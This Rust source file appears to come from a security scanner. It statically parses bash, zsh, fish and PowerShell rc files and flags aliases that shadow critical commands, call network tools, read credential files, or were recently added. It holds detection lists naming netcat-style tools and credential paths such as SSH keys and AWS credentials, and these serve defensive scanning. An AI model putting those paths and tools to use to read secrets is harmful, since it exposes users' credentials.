//! Shell-alias / function risk detection (M9 ch3). Enumerates a user's shell
//! aliases/functions and classifies each against four rules (overrides a
//! critical command, hides a network call, reads a credential file, recently
//! added). Powers `tirith aliases scan|explain`.
//!
//! ## Two-tier, static-first (safe by construction)
//!
//! Tier 1 (DEFAULT): [`scan_with_root`] statically parses the well-known
//! rc/profile files — it NEVER evaluates them, so a malicious rc can't run code.
//!
//! Tier 2 (OPT-IN — `include_runtime`): additionally shells out with explicit
//! no-rc flags (`bash --norc --noprofile -c 'alias'`, `zsh -f -c 'alias'`,
//! `fish --no-config -c 'functions'`) so the real rc files are NOT sourced;
//! shells without a reliable no-rc switch are skipped. It surfaces aliases the
//! static parser can't see. Tests always pass `include_runtime=false` (hermetic).
//!
//! ## The 4 rules are externally triggered
//!
//! `scan` is the only producer of [`AliasFinding`]s; the four rules fire from
//! the alias parser, never from `engine::analyze`, so they carry no
//! PATTERN_TABLE entry and live in `EXTERNALLY_TRIGGERED_RULES`.
//!
//! ## Robustness
//!
//! Brace-balanced function bodies are best-effort: an unbalanced body is still
//! recorded with `body_parsed = false` so the CLI can print a "review manually"
//! note. Parsing never panics on odd input (bare `alias`, unterminated quote,
//! non-ASCII keyword head).

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime};

use serde::{Deserialize, Serialize};

use crate::util::{run_shell_with_timeout, ShellTimeoutOutcome};
use crate::verdict::{RuleId, Severity};

/// Budget for each runtime shell-out (matches the M8/M9-ch2 context detector).
const RUNTIME_SHELL_TIMEOUT: Duration = Duration::from_millis(1500);

/// Runtime introspection cache TTL, keyed by process PID so repeated
/// `--include-runtime` scans reuse the enumeration. Static scans don't touch it.
const RUNTIME_CACHE_TTL: Duration = Duration::from_secs(60);

/// "Recently added" threshold: an rc file mtime within this window fires
/// [`RuleId::AliasRecentlyAdded`].
const RECENTLY_ADDED_WINDOW: Duration = Duration::from_secs(60 * 60);

/// Critical commands an alias/function must not silently shadow (M9 ch3 spec).
const CRITICAL_COMMANDS: &[&str] = &[
    "ls", "cd", "git", "ssh", "sudo", "npm", "pip", "docker", "kubectl", "aws",
];

/// Where an [`AliasEntry`] was discovered.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AliasSource {
    /// Parsed statically out of an rc/profile file (the default tier).
    StaticFile,
    /// Enumerated at runtime via a no-rc shell-out (the `--include-runtime`
    /// tier). Carries no source file / line.
    Runtime,
}

impl AliasSource {
    pub fn as_str(self) -> &'static str {
        match self {
            AliasSource::StaticFile => "static_file",
            AliasSource::Runtime => "runtime",
        }
    }
}

/// The shell an alias/function belongs to.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AliasShell {
    Bash,
    Zsh,
    Fish,
    PowerShell,
}

impl AliasShell {
    pub fn as_str(self) -> &'static str {
        match self {
            AliasShell::Bash => "bash",
            AliasShell::Zsh => "zsh",
            AliasShell::Fish => "fish",
            AliasShell::PowerShell => "powershell",
        }
    }
}

/// Whether a definition is an alias or a function (they parse differently and
/// read differently in `explain`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AliasKind {
    Alias,
    Function,
}

impl AliasKind {
    pub fn as_str(self) -> &'static str {
        match self {
            AliasKind::Alias => "alias",
            AliasKind::Function => "function",
        }
    }
}

/// One enumerated alias or function definition.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AliasEntry {
    pub name: String,
    /// Alias RHS, or a function's (best-effort) body between braces. Empty when
    /// the body could not be isolated.
    pub body: String,
    pub kind: AliasKind,
    pub shell: AliasShell,
    /// How it was discovered (static file vs runtime shell-out).
    pub source: AliasSource,
    /// The rc/profile file it was parsed from (static tier only).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_path: Option<PathBuf>,
    /// 1-based line number within `source_path`, when known.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    /// `false` flags an unbalanced/unparseable body so the CLI prints a
    /// "review manually" note instead of pretending to know it.
    pub body_parsed: bool,
}

/// A single risk finding emitted for an [`AliasEntry`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AliasFinding {
    pub rule_id: RuleId,
    /// Severity (drives the scan exit code).
    pub severity: Severity,
    pub name: String,
    pub kind: AliasKind,
    pub shell: AliasShell,
    /// Human-readable location (`~/.zshrc:42`, or `runtime:bash`).
    pub location: String,
    /// Why the rule fired; credential-redacted where it echoes body content.
    pub detail: String,
}

impl AliasFinding {
    /// `true` when this finding is High or Critical (drives scan exit 1).
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

/// The full result of an alias scan: every enumerated entry plus the findings.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct AliasScan {
    /// Every alias/function discovered (static, plus runtime when opted in).
    pub entries: Vec<AliasEntry>,
    pub findings: Vec<AliasFinding>,
    /// Runtime shells requested but skipped (unsupported / not installed).
    pub runtime_skipped: Vec<String>,
}

/// Scan the real home directory's shell configs (resolves `HOME` via the `home`
/// crate; empty scan if it can't be resolved). Delegates to [`scan_with_root`].
pub fn scan(include_runtime: bool) -> AliasScan {
    match home::home_dir() {
        Some(h) => scan_with_root(&h, include_runtime),
        None => AliasScan::default(),
    }
}

/// Testable entry point: enumerate + classify aliases under `home` (stands in
/// for `~`). The static tier reads rc/profile files under `home`; the optional
/// runtime tier shells out with no-rc flags (ignoring `home`). Tests pass a
/// tempdir and always `include_runtime=false`; `std::env` is never mutated.
pub fn scan_with_root(home: &Path, include_runtime: bool) -> AliasScan {
    let mut entries = collect_static(home);

    let mut runtime_skipped = Vec::new();
    if include_runtime {
        let (runtime_entries, skipped) = collect_runtime();
        entries.extend(runtime_entries);
        runtime_skipped = skipped;
    }

    let findings = classify_all(&entries);

    AliasScan {
        entries,
        findings,
        runtime_skipped,
    }
}

/// CLI wrapper over [`explain_with_root`] that resolves the real home dir
/// (empty result if it can't be resolved).
pub fn explain(name: &str, include_runtime: bool) -> AliasExplain {
    match home::home_dir() {
        Some(h) => explain_with_root(&h, name, include_runtime),
        None => AliasExplain::default(),
    }
}

/// Look up a single alias/function by name across the static tier (and runtime
/// when opted in) and return it plus any findings against it. Powers
/// `tirith aliases explain <name>`.
pub fn explain_with_root(home: &Path, name: &str, include_runtime: bool) -> AliasExplain {
    let scan = scan_with_root(home, include_runtime);
    let matches: Vec<AliasEntry> = scan
        .entries
        .into_iter()
        .filter(|e| e.name == name)
        .collect();
    let findings: Vec<AliasFinding> = scan
        .findings
        .into_iter()
        .filter(|f| f.name == name)
        .collect();
    AliasExplain { matches, findings }
}

/// Result of [`explain_with_root`]: the matching definition(s) and any findings.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct AliasExplain {
    /// Every definition matching the name (a name may be defined in >1 file/shell).
    pub matches: Vec<AliasEntry>,
    pub findings: Vec<AliasFinding>,
}

// Static tier (default, no shell execution).

/// rc/profile files inspected statically, paired with the shell they belong to.
const STATIC_RC_FILES: &[(&str, AliasShell)] = &[
    (".bashrc", AliasShell::Bash),
    (".bash_profile", AliasShell::Bash),
    (".zshrc", AliasShell::Zsh),
    (".zprofile", AliasShell::Zsh),
    (".config/fish/config.fish", AliasShell::Fish),
];

/// PowerShell profile paths (added only when present — they vary by host).
const STATIC_PS_PROFILES: &[&str] = &[
    ".config/powershell/Microsoft.PowerShell_profile.ps1",
    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
    "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
];

/// Read every static rc file under `home` and parse out its aliases/functions.
fn collect_static(home: &Path) -> Vec<AliasEntry> {
    let mut entries = Vec::new();

    for (rel, shell) in STATIC_RC_FILES {
        let path = home.join(rel);
        if let Some(contents) = read_text_if_file(&path) {
            let recent = file_recently_modified(&path);
            parse_file(&contents, *shell, &path, recent, &mut entries);
        }
    }

    for rel in STATIC_PS_PROFILES {
        let path = home.join(rel);
        if let Some(contents) = read_text_if_file(&path) {
            let recent = file_recently_modified(&path);
            parse_powershell(&contents, &path, recent, &mut entries);
        }
    }

    entries
}

/// Parse a shell rc file's contents into [`AliasEntry`]s. Dispatches on shell:
/// fish uses a distinct `function … end` and `alias name value` syntax.
fn parse_file(
    contents: &str,
    shell: AliasShell,
    path: &Path,
    file_recent: bool,
    out: &mut Vec<AliasEntry>,
) {
    match shell {
        AliasShell::Fish => parse_fish(contents, path, file_recent, out),
        AliasShell::Bash | AliasShell::Zsh => parse_posix(contents, shell, path, file_recent, out),
        // PowerShell is parsed by its own function (see `parse_powershell`).
        AliasShell::PowerShell => parse_powershell(contents, path, file_recent, out),
    }
}

/// Parse bash/zsh `alias` and POSIX function definitions, line by line.
/// Multi-line function bodies are accumulated by brace balance; an unbalanced
/// body is recorded with `body_parsed = false`.
fn parse_posix(
    contents: &str,
    shell: AliasShell,
    path: &Path,
    file_recent: bool,
    out: &mut Vec<AliasEntry>,
) {
    let lines: Vec<&str> = contents.lines().collect();
    let mut i = 0usize;
    while i < lines.len() {
        let lineno = i + 1;
        let raw = lines[i];
        let line = strip_leading(raw);

        // Skip comments / blanks fast.
        if line.is_empty() || line.starts_with('#') {
            i += 1;
            continue;
        }

        // `alias …`
        if let Some(rest) = strip_keyword(line, "alias") {
            if let Some((name, body)) = parse_alias_assignment(rest) {
                out.push(AliasEntry {
                    name,
                    body,
                    kind: AliasKind::Alias,
                    shell,
                    source: AliasSource::StaticFile,
                    source_path: Some(path.to_path_buf()),
                    line: Some(lineno),
                    body_parsed: true,
                });
            }
            // A bare `alias` with no `=` lists aliases — nothing to record.
            i += 1;
            continue;
        }

        // Function definitions: `function name …` or `name() …`.
        if let Some((name, consumed, body, parsed)) = try_parse_posix_function(&lines, i) {
            out.push(AliasEntry {
                name,
                body,
                kind: AliasKind::Function,
                shell,
                source: AliasSource::StaticFile,
                source_path: Some(path.to_path_buf()),
                line: Some(lineno),
                body_parsed: parsed,
            });
            i += consumed.max(1);
            continue;
        }

        i += 1;
    }
    let _ = file_recent; // recency is applied in classify via per-entry lookup
}

/// Parse an `alias name=value` RHS into `(name, body)` (single/double/bare).
/// `None` for a bare `alias name` listing form or an empty name.
fn parse_alias_assignment(rest: &str) -> Option<(String, String)> {
    let rest = rest.trim_start();
    // Some shells accept `alias -g name=…`; skip leading short flags.
    let rest = skip_alias_flags(rest);

    let eq = rest.find('=')?;
    let name = rest[..eq].trim();
    if name.is_empty() || !is_valid_name(name) {
        return None;
    }
    let value = &rest[eq + 1..];
    let body = unquote(value.trim());
    Some((name.to_string(), body))
}

/// Skip leading single-dash alias flags (`-g`, `-x`, …) so `alias -g foo=bar`
/// parses. Stops at the first token containing `=` or a non-flag token.
fn skip_alias_flags(rest: &str) -> &str {
    let mut cur = rest.trim_start();
    while cur.starts_with('-') {
        // A flag token ends at whitespace; if it contains `=` it's actually the
        // assignment (e.g. a name starting with `-` is invalid anyway), stop.
        let end = cur.find(char::is_whitespace).unwrap_or(cur.len());
        let token = &cur[..end];
        if token.contains('=') {
            break;
        }
        cur = cur[end..].trim_start();
    }
    cur
}

/// Try to parse a POSIX function (`function name() {…}`, `function name {…}`,
/// `name() {…}`) starting at `lines[start]`, returning `(name, lines_consumed,
/// body, body_parsed)`. The body accumulates until braces balance; a never-
/// balanced (truncated) body returns `body_parsed = false`.
fn try_parse_posix_function(lines: &[&str], start: usize) -> Option<(String, usize, String, bool)> {
    let first = strip_leading(lines[start]);

    let (name, after_header) = if let Some(rest) = strip_keyword(first, "function") {
        // `function name() …` or `function name …`
        let rest = rest.trim_start();
        let (raw_name, tail) = split_name(rest);
        if raw_name.is_empty() {
            return None;
        }
        // Drop an optional `()` after the name.
        let tail = tail.trim_start();
        let tail = tail.strip_prefix("()").unwrap_or(tail);
        (clean_name(raw_name), tail.trim_start().to_string())
    } else {
        // `name() …` form: require `(` then `)` so we don't match a plain
        // command invocation like `git status`.
        let (raw_name, tail) = split_name(first);
        if raw_name.is_empty() || !is_valid_name(&clean_name(raw_name)) {
            return None;
        }
        let tail = tail.trim_start();
        let tail = tail.strip_prefix('(')?.trim_start();
        let tail = tail.strip_prefix(')')?;
        (clean_name(raw_name), tail.trim_start().to_string())
    };

    if !is_valid_name(&name) {
        return None;
    }

    // Pull lines until the opening brace appears.
    let mut buffer = String::new();
    buffer.push_str(&after_header);
    let mut idx = start;
    while !buffer.contains('{') {
        idx += 1;
        if idx >= lines.len() {
            // No body brace — not a function (avoids eating the rest of the file).
            return None;
        }
        buffer.push('\n');
        buffer.push_str(lines[idx]);
    }

    // Balance braces from the first `{`.
    let open_pos = buffer.find('{').unwrap();
    let mut depth = 0i32;
    let mut body = String::new();
    let mut started = false;
    let mut balanced = false;

    // Helper to feed a slice of chars into the balancer.
    let feed = |s: &str, depth: &mut i32, body: &mut String, started: &mut bool| -> bool {
        for ch in s.chars() {
            match ch {
                '{' => {
                    *depth += 1;
                    if *depth == 1 && !*started {
                        *started = true;
                        continue; // don't include the outermost opening brace
                    }
                }
                '}' => {
                    *depth -= 1;
                    if *depth == 0 {
                        return true; // balanced
                    }
                }
                _ => {}
            }
            if *started {
                body.push(ch);
            }
        }
        false
    };

    if feed(&buffer[open_pos..], &mut depth, &mut body, &mut started) {
        balanced = true;
    } else {
        // Keep pulling lines until balanced or EOF.
        let mut cur = idx;
        while !balanced {
            cur += 1;
            if cur >= lines.len() {
                break;
            }
            body.push('\n');
            if feed(lines[cur], &mut depth, &mut body, &mut started) {
                balanced = true;
            }
            idx = cur;
        }
    }

    let consumed = idx - start + 1;
    let body = body.trim().to_string();
    Some((name, consumed, body, balanced))
}

// Fish tier.

/// Parse fish `alias name 'value'`, `alias name=value`, and
/// `function name; … ; end` definitions.
fn parse_fish(contents: &str, path: &Path, file_recent: bool, out: &mut Vec<AliasEntry>) {
    let lines: Vec<&str> = contents.lines().collect();
    let mut i = 0usize;
    while i < lines.len() {
        let lineno = i + 1;
        let line = strip_leading(lines[i]);
        if line.is_empty() || line.starts_with('#') {
            i += 1;
            continue;
        }

        // fish alias: `alias name=value` OR `alias name 'value'`.
        if let Some(rest) = strip_keyword(line, "alias") {
            if let Some((name, body)) = parse_fish_alias(rest) {
                out.push(AliasEntry {
                    name,
                    body,
                    kind: AliasKind::Alias,
                    shell: AliasShell::Fish,
                    source: AliasSource::StaticFile,
                    source_path: Some(path.to_path_buf()),
                    line: Some(lineno),
                    body_parsed: true,
                });
            }
            i += 1;
            continue;
        }

        // fish function: `function name …` … `end`.
        if let Some(rest) = strip_keyword(line, "function") {
            let (raw_name, _tail) = split_name(rest.trim_start());
            let name = clean_name(raw_name);
            if is_valid_name(&name) {
                // Accumulate until a line that is exactly `end`.
                let mut body = String::new();
                let mut j = i + 1;
                let mut closed = false;
                while j < lines.len() {
                    let bl = strip_leading(lines[j]);
                    if bl == "end" {
                        closed = true;
                        break;
                    }
                    if !body.is_empty() {
                        body.push('\n');
                    }
                    body.push_str(lines[j]);
                    j += 1;
                }
                out.push(AliasEntry {
                    name,
                    body: body.trim().to_string(),
                    kind: AliasKind::Function,
                    shell: AliasShell::Fish,
                    source: AliasSource::StaticFile,
                    source_path: Some(path.to_path_buf()),
                    line: Some(lineno),
                    body_parsed: closed,
                });
                i = if closed { j + 1 } else { j };
                continue;
            }
        }

        i += 1;
    }
    let _ = file_recent;
}

/// Parse a fish alias RHS (`name=value` or `name value`) into `(name, body)`.
fn parse_fish_alias(rest: &str) -> Option<(String, String)> {
    let rest = rest.trim();
    if let Some(eq) = rest.find('=') {
        // `alias name=value` — only if the name (before `=`) has no space.
        let name = rest[..eq].trim();
        if is_valid_name(name) && !name.contains(char::is_whitespace) {
            let body = unquote(rest[eq + 1..].trim());
            return Some((name.to_string(), body));
        }
    }
    // `alias name 'value …'`
    let (name, tail) = split_name(rest);
    let name = clean_name(name);
    if !is_valid_name(&name) {
        return None;
    }
    let body = unquote(tail.trim());
    if body.is_empty() {
        return None;
    }
    Some((name, body))
}

// PowerShell tier.

/// Parse PowerShell `Set-Alias`/`New-Alias` and `function Name { … }`.
fn parse_powershell(contents: &str, path: &Path, file_recent: bool, out: &mut Vec<AliasEntry>) {
    let lines: Vec<&str> = contents.lines().collect();
    let mut i = 0usize;
    while i < lines.len() {
        let lineno = i + 1;
        let line = strip_leading(lines[i]);
        if line.is_empty() || line.starts_with('#') {
            i += 1;
            continue;
        }

        let lower = line.to_ascii_lowercase();
        if lower.starts_with("set-alias") || lower.starts_with("new-alias") {
            if let Some((name, body)) = parse_ps_alias(line) {
                out.push(AliasEntry {
                    name,
                    body,
                    kind: AliasKind::Alias,
                    shell: AliasShell::PowerShell,
                    source: AliasSource::StaticFile,
                    source_path: Some(path.to_path_buf()),
                    line: Some(lineno),
                    body_parsed: true,
                });
            }
            i += 1;
            continue;
        }

        if lower.starts_with("function ") {
            // `function Name { … }` — reuse the brace balancer.
            let after = &line["function".len()..];
            let (raw_name, tail) = split_name(after.trim_start());
            let name = clean_name(raw_name);
            if is_valid_name(&name) {
                if let Some((body, consumed, parsed)) =
                    balance_ps_function(&lines, i, tail.trim_start())
                {
                    out.push(AliasEntry {
                        name,
                        body,
                        kind: AliasKind::Function,
                        shell: AliasShell::PowerShell,
                        source: AliasSource::StaticFile,
                        source_path: Some(path.to_path_buf()),
                        line: Some(lineno),
                        body_parsed: parsed,
                    });
                    i += consumed.max(1);
                    continue;
                }
            }
        }

        i += 1;
    }
    let _ = file_recent;
}

/// Parse a `Set-Alias`/`New-Alias` line, positional (`Set-Alias gco
/// git-checkout`) or named (`Set-Alias -Name gco -Value …`).
fn parse_ps_alias(line: &str) -> Option<(String, String)> {
    let tokens: Vec<&str> = line.split_whitespace().collect();
    if tokens.len() < 3 {
        return None;
    }
    let mut name: Option<String> = None;
    let mut value: Option<String> = None;
    let mut idx = 1;
    let mut positional: Vec<String> = Vec::new();
    while idx < tokens.len() {
        let t = tokens[idx];
        let tl = t.to_ascii_lowercase();
        if tl == "-name" && idx + 1 < tokens.len() {
            name = Some(unquote(tokens[idx + 1]));
            idx += 2;
            continue;
        }
        if tl == "-value" && idx + 1 < tokens.len() {
            value = Some(unquote(tokens[idx + 1]));
            idx += 2;
            continue;
        }
        if t.starts_with('-') {
            idx += 1;
            continue;
        }
        positional.push(unquote(t));
        idx += 1;
    }
    let name = name.or_else(|| positional.first().cloned())?;
    let value = value
        .or_else(|| positional.get(1).cloned())
        .unwrap_or_default();
    if !is_valid_name(&name) {
        return None;
    }
    Some((name, value))
}

/// Balance a PowerShell `function` body across lines, starting at `lines[start]`
/// with `tail` being the post-name remainder of the header line.
fn balance_ps_function(lines: &[&str], start: usize, tail: &str) -> Option<(String, usize, bool)> {
    let mut buffer = String::from(tail);
    let mut idx = start;
    while !buffer.contains('{') {
        idx += 1;
        if idx >= lines.len() {
            return None;
        }
        buffer.push('\n');
        buffer.push_str(lines[idx]);
    }
    let open_pos = buffer.find('{').unwrap();
    let mut depth = 0i32;
    let mut started = false;
    let mut body = String::new();
    let mut balanced = false;

    let feed = |s: &str, depth: &mut i32, body: &mut String, started: &mut bool| -> bool {
        for ch in s.chars() {
            match ch {
                '{' => {
                    *depth += 1;
                    if *depth == 1 && !*started {
                        *started = true;
                        continue;
                    }
                }
                '}' => {
                    *depth -= 1;
                    if *depth == 0 {
                        return true;
                    }
                }
                _ => {}
            }
            if *started {
                body.push(ch);
            }
        }
        false
    };

    if feed(&buffer[open_pos..], &mut depth, &mut body, &mut started) {
        balanced = true;
    } else {
        let mut cur = idx;
        while !balanced {
            cur += 1;
            if cur >= lines.len() {
                break;
            }
            body.push('\n');
            if feed(lines[cur], &mut depth, &mut body, &mut started) {
                balanced = true;
            }
            idx = cur;
        }
    }
    Some((body.trim().to_string(), idx - start + 1, balanced))
}

// Runtime tier (opt-in, no-rc shell-out).

/// One PID-keyed cached runtime result.
struct RuntimeCacheEntry {
    pid: u32,
    at: Instant,
    entries: Vec<AliasEntry>,
    skipped: Vec<String>,
}

static RUNTIME_CACHE: Mutex<Option<RuntimeCacheEntry>> = Mutex::new(None);

/// Enumerate aliases/functions via no-rc shell-outs → `(entries, skipped)`,
/// cached per PID for [`RUNTIME_CACHE_TTL`] so repeated scans don't re-spawn.
fn collect_runtime() -> (Vec<AliasEntry>, Vec<String>) {
    let pid = std::process::id();

    if let Ok(guard) = RUNTIME_CACHE.lock() {
        if let Some(entry) = guard.as_ref() {
            if entry.pid == pid && entry.at.elapsed() < RUNTIME_CACHE_TTL {
                return (entry.entries.clone(), entry.skipped.clone());
            }
        }
    }

    let (entries, skipped) = collect_runtime_uncached();

    if let Ok(mut guard) = RUNTIME_CACHE.lock() {
        *guard = Some(RuntimeCacheEntry {
            pid,
            at: Instant::now(),
            entries: entries.clone(),
            skipped: skipped.clone(),
        });
    }

    (entries, skipped)
}

/// The actual shell-outs (no caching). Each shell is invoked with explicit
/// no-rc flags so the user's real rc files are NOT sourced.
fn collect_runtime_uncached() -> (Vec<AliasEntry>, Vec<String>) {
    let mut entries = Vec::new();
    let mut skipped = Vec::new();

    match run_no_rc("bash", &["--norc", "--noprofile", "-c", "alias"]) {
        RuntimeOutcome::Output(out) => {
            for (name, body) in parse_runtime_alias_output(&out) {
                entries.push(runtime_entry(name, body, AliasShell::Bash));
            }
        }
        RuntimeOutcome::Unsupported => skipped.push("bash".to_string()),
    }

    // `-f` == NO_RCS (sources nothing).
    match run_no_rc("zsh", &["-f", "-c", "alias"]) {
        RuntimeOutcome::Output(out) => {
            for (name, body) in parse_runtime_alias_output(&out) {
                entries.push(runtime_entry(name, body, AliasShell::Zsh));
            }
        }
        RuntimeOutcome::Unsupported => skipped.push("zsh".to_string()),
    }

    // fish aliases are functions; `functions --names` lists names only (no body),
    // so we record the name (override check still fires) with body_parsed=false.
    match run_no_rc("fish", &["--no-config", "-c", "functions --names"]) {
        RuntimeOutcome::Output(out) => {
            for name in out.lines().map(str::trim).filter(|l| !l.is_empty()) {
                entries.push(AliasEntry {
                    name: name.to_string(),
                    body: String::new(),
                    kind: AliasKind::Function,
                    shell: AliasShell::Fish,
                    source: AliasSource::Runtime,
                    source_path: None,
                    line: None,
                    body_parsed: false,
                });
            }
        }
        RuntimeOutcome::Unsupported => skipped.push("fish".to_string()),
    }

    // No reliable cross-platform safe-by-default no-profile one-liner for
    // PowerShell; unsupported in runtime mode (static tier still covers $PROFILE).
    skipped.push("powershell".to_string());

    (entries, skipped)
}

/// Outcome of a single no-rc shell-out.
enum RuntimeOutcome {
    Output(String),
    /// The shell is not installed, timed out, errored, or has no reliable
    /// no-rc support.
    Unsupported,
}

/// Run a shell with no-rc flags via the shared timeout helper. Missing binary /
/// non-zero exit / timeout → [`RuntimeOutcome::Unsupported`].
fn run_no_rc(program: &str, args: &[&str]) -> RuntimeOutcome {
    match run_shell_with_timeout(
        program,
        args,
        RUNTIME_SHELL_TIMEOUT,
        Duration::from_millis(25),
        std::process::Stdio::null(),
    ) {
        ShellTimeoutOutcome::Completed { status, stdout } if status.success() => {
            RuntimeOutcome::Output(String::from_utf8_lossy(&stdout).into_owned())
        }
        _ => RuntimeOutcome::Unsupported,
    }
}

/// Build a runtime [`AliasEntry`] (no source path/line; body from the shell's
/// own `alias` listing).
fn runtime_entry(name: String, body: String, shell: AliasShell) -> AliasEntry {
    AliasEntry {
        name,
        body,
        kind: AliasKind::Alias,
        shell,
        source: AliasSource::Runtime,
        source_path: None,
        line: None,
        body_parsed: true,
    }
}

/// Parse `alias` output (`name='value'` or `alias name='value'`, one per line)
/// into `(name, body)` pairs.
fn parse_runtime_alias_output(out: &str) -> Vec<(String, String)> {
    let mut pairs = Vec::new();
    for raw in out.lines() {
        let line = strip_leading(raw);
        // zsh emits `name=value`; bash emits `alias name='value'`.
        let line = strip_keyword(line, "alias").unwrap_or(line);
        if let Some((name, body)) = parse_alias_assignment(line) {
            pairs.push((name, body));
        }
    }
    pairs
}

// Classification (the 4 rules).

/// Run the four risk rules over every entry, returning all findings.
fn classify_all(entries: &[AliasEntry]) -> Vec<AliasFinding> {
    let mut findings = Vec::new();
    for entry in entries {
        classify_entry(entry, &mut findings);
    }
    findings
}

/// Classify a single entry against the four rules.
fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
    let location = entry_location(entry);

    // Rule 1 — overrides a critical command (Medium). Fires on the NAME.
    if CRITICAL_COMMANDS.contains(&entry.name.as_str()) {
        out.push(AliasFinding {
            rule_id: RuleId::AliasOverridesCriticalCommand,
            severity: Severity::Medium,
            name: entry.name.clone(),
            kind: entry.kind,
            shell: entry.shell,
            location: location.clone(),
            detail: format!(
                "{} shadows critical command `{}`",
                entry.kind.as_str(),
                entry.name
            ),
        });
    }

    // Rules 2 & 3 inspect the BODY (a bodyless runtime fish entry is skipped
    // here but still got the name-based override check above).
    if !entry.body.is_empty() {
        // Rule 2 — network call (High).
        if let Some(tool) = body_network_tool(&entry.body) {
            out.push(AliasFinding {
                rule_id: RuleId::AliasContainsNetworkCall,
                severity: Severity::High,
                name: entry.name.clone(),
                kind: entry.kind,
                shell: entry.shell,
                location: location.clone(),
                detail: format!("body invokes `{tool}` (network call)"),
            });
        }

        // Rule 3 — credential-file read (High).
        if let Some(target) = body_reads_credential(&entry.body) {
            out.push(AliasFinding {
                rule_id: RuleId::AliasContainsCredentialRead,
                severity: Severity::High,
                name: entry.name.clone(),
                kind: entry.kind,
                shell: entry.shell,
                location: location.clone(),
                detail: format!("body references credential path `{target}`"),
            });
        }
    }

    // Rule 4 — recently added (Info). Fires when the defining rc file's mtime
    // is within the window. Runtime entries (no source path) cannot be dated.
    if let Some(path) = entry.source_path.as_ref() {
        if file_recently_modified(path) {
            out.push(AliasFinding {
                rule_id: RuleId::AliasRecentlyAdded,
                severity: Severity::Info,
                name: entry.name.clone(),
                kind: entry.kind,
                shell: entry.shell,
                location,
                detail: format!(
                    "defined in {} which was modified within the last hour",
                    path.display()
                ),
            });
        }
    }
}

/// Network tools an alias body must not silently invoke. Returns the first
/// matching tool name when the body contains it as a command word.
fn body_network_tool(body: &str) -> Option<&'static str> {
    const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat"];
    TOOLS
        .iter()
        .find(|&&tool| contains_command_word(body, tool))
        .copied()
}

/// Credential-path fragments an alias body must not read. Returns the first
/// matching fragment found in the body.
fn body_reads_credential(body: &str) -> Option<String> {
    // Order only decides which we report first; all are High.
    const FRAGMENTS: &[&str] = &[
        ".aws/credentials",
        ".aws/config",
        ".ssh/id_",
        ".ssh/id_rsa",
        ".ssh/id_ed25519",
        ".netrc",
        ".npmrc",
        ".pypirc",
        ".docker/config.json",
        ".kube/config",
        ".git-credentials",
        ".config/gh/hosts.yml",
    ];
    for frag in FRAGMENTS {
        if body.contains(frag) {
            return Some((*frag).to_string());
        }
    }
    None
}

/// `true` when `body` contains `word` as a command word — i.e. preceded by a
/// shell boundary (start, whitespace, `|`, `;`, `&`, `(`, backtick, `=`) and
/// followed by whitespace or end. This avoids matching `curl` inside
/// `securely` or a path like `/usr/bin/curling`.
fn contains_command_word(body: &str, word: &str) -> bool {
    let bytes = body.as_bytes();
    let wlen = word.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(word) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t' | b'|' | b';' | b'&' | b'(' | b'`' | b'=' | b'\n' | b'/' | b'$'
            );
        let after = pos + wlen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
                b' ' | b'\t' | b'|' | b';' | b'&' | b')' | b'`' | b'\n' | b'\r'
            );
        // A `/`-prefixed exact match (`/usr/bin/curl`) IS a network call;
        // `curling` is already rejected by after_ok.
        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

// Small parsing helpers.

/// Strip leading whitespace (spaces + tabs) but keep the rest verbatim.
fn strip_leading(s: &str) -> &str {
    s.trim_start_matches([' ', '\t'])
}

/// If `line` begins with `keyword` followed by whitespace, return the trimmed
/// remainder. ASCII-only, so a non-ASCII head never panics or false-matches.
fn strip_keyword<'a>(line: &'a str, keyword: &str) -> Option<&'a str> {
    let rest = line.strip_prefix(keyword)?;
    // Require a whitespace boundary so `aliased` doesn't match `alias`.
    let first = rest.chars().next();
    match first {
        Some(c) if c.is_whitespace() => Some(rest.trim_start()),
        _ => None,
    }
}

/// Split off the leading "word" (up to the first whitespace, `(`, or `=`) and
/// return `(word, rest)`.
fn split_name(s: &str) -> (&str, &str) {
    let end = s
        .find(|c: char| c.is_whitespace() || c == '(' || c == '=')
        .unwrap_or(s.len());
    (&s[..end], &s[end..])
}

/// Strip surrounding quotes and a trailing `()` artifact from a parsed name.
fn clean_name(name: &str) -> String {
    let n = name.trim();
    let n = n.strip_suffix("()").unwrap_or(n);
    unquote(n.trim())
}

/// Remove one layer of matching single or double quotes, if present. Leaves
/// unquoted or mismatched input untouched. Never panics on a 1-char string.
fn unquote(s: &str) -> String {
    let s = s.trim();
    if s.len() >= 2 {
        let b = s.as_bytes();
        let first = b[0];
        let last = b[s.len() - 1];
        if (first == b'\'' && last == b'\'') || (first == b'"' && last == b'"') {
            return s[1..s.len() - 1].to_string();
        }
    }
    s.to_string()
}

/// `true` when `name` is a plausible alias/function identifier (non-empty, no
/// whitespace, only letters/digits/`_`/`-`/`.`/`:`/`+`). Rejects assignment
/// fragments and garbage so we don't record `if`-blocks as functions.
fn is_valid_name(name: &str) -> bool {
    if name.is_empty() {
        return false;
    }
    name.chars()
